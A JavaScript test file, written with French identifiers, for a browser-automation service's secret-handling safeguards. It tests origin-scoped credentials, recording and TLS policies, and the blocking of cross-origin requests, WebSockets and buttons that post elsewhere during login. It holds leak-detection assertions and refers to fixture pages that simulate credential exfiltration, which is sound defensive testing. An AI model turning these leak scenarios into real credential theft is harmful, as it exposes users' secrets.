    assert.equal(pose.statut, 200, pose.texte);
    await new Promise((r) => setTimeout(r, 800));
    const bascule = await service.post('/switch_tab', { owner: o, session_id: sid, tab_index: 1 });
    assert.match(bascule.corps.url, /\/login$/, bascule.texte);
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    await service.post('/switch_tab', { owner: o, session_id: sid, tab_index: 0 });
    await new Promise((r) => setTimeout(r, 300));
    const lu = await evaluer(o, sid, 'return window.lu');
    assert.equal(lu.statut, 200, lu.texte);
    assert.ok(!contient(lu.texte), lu.texte);
    await arreter(o, sid);
});

test('enregistrement HAR ou trace actif : précontrôle et connexion refusés (409 secret_recording_active) ; trace exportée : connexion permise', { skip: SAUTER }, async () => {
    for (const option of [{ record_har: true }, { trace: true }]) {
        const o = proprio();
        const sid = await ouvrir(o, '/login', option);
        const avant = recus.length;
        for (const r of [await service.post('/login_precheck', { owner: o, session_id: sid }), await connecter(o, sid, cibles)]) {
            assert.equal(r.statut, 409, `${JSON.stringify(option)} ${r.texte}`);
            assert.equal(r.corps.code, 'secret_recording_active');
            assert.ok(r.corps.fix, r.texte);
        }
        assert.equal(recus.slice(avant).filter((l) => l.startsWith('POST')).length, 0);
        if (option.trace) {
            const exp = await service.post('/trace_export', { owner: o, session_id: sid });
            assert.equal(exp.corps.ok, true, exp.texte);
            const ok = await connecter(o, sid, cibles);
            assert.equal(ok.corps.ok, true, ok.texte);
        }
        await arreter(o, sid);
    }
});

test('démarrage : credentials_origin sans autre option, d\'une autre origine refusé ; HAR et trace refusés avec des identifiants ; tls inconnu refusé', { skip: SAUTER }, async () => {
    const o = proprio();
    const ailleurs = await service.post('/start', { owner: o, url: `${site.base}/basic`, username: IDENTIFIANT, password: SECRET, credentials_origin: autre.base });
    assert.equal(ailleurs.statut, 400);
    assert.equal(ailleurs.corps.code, 'secret_scope_mismatch');
    for (const option of [{ record_har: true }, { trace: true }]) {
        const r = await service.post('/start', { owner: o, url: `${site.base}/basic`, username: IDENTIFIANT, password: SECRET, credentials_origin: site.base, tls: 'strict', ...option });
        assert.equal(r.statut, 400, r.texte);
        assert.equal(r.corps.code, 'recording_with_credentials');
    }
    const tls = await service.post('/start', { owner: o, url: `${site.base}/login`, tls: 'parfois' });
    assert.equal(tls.statut, 400, tls.texte);
    assert.ok(!contient(ailleurs.texte));
});

for (const schema of ['basic', 'digest'])
    test(`authentification HTTP ${schema} liée à credentials_origin (origine http) : page protégée ouverte, secret absent des réponses, eval et mocks permis, rien vers une autre origine`, { skip: SAUTER }, async () => {
        const o = proprio();
        const r = await service.post('/start', { owner: o, url: `${site.base}/${schema}`, tls: 'strict', username: IDENTIFIANT, password: SECRET, credentials_origin: site.base });
        assert.equal(r.statut, 200, r.texte);
        const sid = r.corps.session_id;
        const t = await service.post('/extract_text', { owner: o, session_id: sid });
        assert.ok(t.texte.includes(`Accès ${schema}`), t.texte.slice(0, 300));
        const e = await evaluer(o, sid, 'return document.title');
        assert.equal(e.corps.result, 'Protégé', e.texte);
        const m = await service.post('/mock/add', { owner: o, session_id: sid, url_pattern: `${site.base}/factice`, status: 200, body: 'x' });
        assert.equal(m.statut, 200, m.texte);
        const reseau = await service.get(`/network?owner=${o}&session_id=${sid}`);
        assert.ok(!contient(r.texte) && !contient(t.texte) && !contient(reseau.texte) && !contient(e.texte));
        const autreOrigine = await service.post('/action', { owner: o, session_id: sid, type: 'goto', url: `${autre.base}/page` });
        assert.equal(autreOrigine.statut, 200, autreOrigine.texte);
        assert.ok(!fuites.some((l) => l.includes(Buffer.from(`${IDENTIFIANT}:${SECRET}`).toString('base64'))));
        await arreter(o, sid);
    });

test('connexion en cours : toute autre route de la session répond 409 secret_login_busy', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-lent');
    const enCours = connecter(o, sid, cibles);
    await new Promise((r) => setTimeout(r, 2500));
    for (const v of [await service.post('/extract_text', { owner: o, session_id: sid }), await service.get(`/list_tabs?owner=${o}&session_id=${sid}`),
        await service.post('/stop', { owner: o, session_id: sid }), await connecter(o, sid, cibles)]) {
        assert.equal(v.statut, 409, v.texte);
        assert.equal(v.corps.code, 'secret_login_busy');
    }
    const r = await enCours;
    assert.equal(r.corps.ok, true, r.texte);
    const apres = await service.post('/extract_text', { owner: o, session_id: sid });
    assert.equal(apres.statut, 200, apres.texte);
    await arreter(o, sid);
});

test('réutilisation et quota : une session à politique TLS n\'est ni reprise ni reprenante, mais cède sa place comme les autres', { skip: SAUTER }, async () => {
    const o = proprio();
    const a = await service.post('/start', { owner: o, url: `${site.base}/` });
    const b = await service.post('/start', { owner: o, url: `${site.base}/login`, tls: 'strict' });
    assert.equal(b.corps.status, 'started', b.texte);
    assert.notEqual(b.corps.session_id, a.corps.session_id);
    const reprise = await service.post('/start', { owner: o, url: `${site.base}/` });
    assert.equal(reprise.corps.reused, true);
    assert.equal(reprise.corps.session_id, a.corps.session_id);
    const c = await service.post('/start', { owner: o, url: `${site.base}/`, isolated: true });
    assert.equal(c.statut, 200, c.texte);
    const d = await service.post('/start', { owner: o, url: `${site.base}/login`, tls: 'strict' });
    assert.equal(d.statut, 200, d.texte);
    const ids = (await service.get(`/sessions?owner=${o}`)).corps.sessions.map((s) => s.session_id);
    assert.deepEqual(ids.sort(), [c.corps.session_id, d.corps.session_id].sort());
    for (const sid of ids) await arreter(o, sid);
});

test('TLS : certificat auto-signé refusé par défaut (tls strict), accepté avec tls=insecure ou sans politique', { skip: SAUTER }, async (t) => {
    if (!tlsSite) return t.skip('openssl absent');
    const o = proprio();
    const strict = await service.post('/start', { owner: o, url: `${tlsSite.base}/`, tls: 'strict' });
    assert.equal(strict.statut, 200, strict.texte);
    assert.equal(strict.corps.tls, 'strict');
    assert.ok(strict.corps.nav_warning && strict.corps.title !== 'TLS', strict.texte);
    const souple = await service.post('/start', { owner: o, url: `${tlsSite.base}/`, tls: 'insecure' });
    assert.equal(souple.corps.tls, 'insecure');
    assert.equal(souple.corps.title, 'TLS', souple.texte);
    for (const r of [strict, souple]) await arreter(o, r.corps.session_id);
    const o2 = proprio();
    const ordinaire = await service.post('/start', { owner: o2, url: `${tlsSite.base}/`, isolated: true });
    assert.equal(ordinaire.corps.title, 'TLS', ordinaire.texte);
    await arreter(o2, ordinaire.corps.session_id);
});

test('après la frappe, le mot de passe reste dans le champ actif à la longueur saisie : focus volé ou valeur tronquée → 400 secret_target_required, rien d\'envoyé', { skip: SAUTER }, async () => {
    for (const chemin of ['/login-focus', '/login-coupe']) {
        const o = proprio();
        const sid = await ouvrir(o, chemin);
        const avant = recus.length;
        const r = await connecter(o, sid, cibles);
        assert.equal(r.statut, 400, `${chemin} ${r.texte}`);
        assert.equal(r.corps.code, 'secret_target_required');
        assert.equal(r.corps.documents_replaced, 1);
        assert.equal(recus.slice(avant).filter((l) => l.startsWith('POST')).length, 0);
        await arreter(o, sid);
    }
});

test('pendant la saisie : requête anodine vers une autre origine coupée sans faire échouer la connexion ; WebSocket qui émet fermé ; bouton par défaut qui poste ailleurs refusé', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-ping');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    assert.ok(!fuites.some((l) => l.includes('/ping')), fuites.join('\n'));
    await arreter(o, sid);
    const o2 = proprio();
    const sid2 = await ouvrir(o2, '/login-ws');
    for (let i = 0; i < 40 && !wsRecus.includes('bonjour'); i++) await new Promise((res) => setTimeout(res, 100));
    assert.ok(wsRecus.includes('bonjour'), `WebSocket direct avant la connexion : ${wsRecus.join(' | ')}`);
    const n0 = wsRecus.filter((m) => m === 'bonjour').length;
    const r2 = await connecter(o2, sid2, cibles);
    assert.equal(r2.corps.ok, true, r2.texte);
    assert.ok(wsRecus.filter((m) => m === 'bonjour').length > n0, `WebSocket relayé hors saisie : ${wsRecus.join(' | ')}`);
    assert.ok(!wsRecus.some(contient), wsRecus.join(' | '));
    await arreter(o2, sid2);
    const o3 = proprio();
    const sid3 = await ouvrir(o3, '/login-bouton');
    const r3 = await connecter(o3, sid3, { username_target: cibles.username_target, password_target: cibles.password_target });
    assert.equal(r3.statut, 403, r3.texte);
    assert.equal(r3.corps.code, 'secret_scope_mismatch');
    assert.ok(!fuites.some(contient), fuites.join('\n'));
    await arreter(o3, sid3);
});

test('onglet remplacé après la connexion : sans historique, un retour arrière ne rejoue pas le POST', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-200');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    assert.equal(r.corps.documents_replaced, 1);
    const postes = () => recus.filter((l) => l.startsWith('POST /session-200')).length;
    const n0 = postes();
    const avant = (await service.get(`/list_tabs?owner=${o}&session_id=${sid}`)).corps.tabs;
    await service.post('/action', { owner: o, session_id: sid, type: 'back' });
    const apres = (await service.get(`/list_tabs?owner=${o}&session_id=${sid}`)).corps.tabs;
    assert.equal(apres.length, 1);
    assert.equal(apres[0].url, avant[0].url);
    assert.equal(postes(), n0);
    await arreter(o, sid);
});
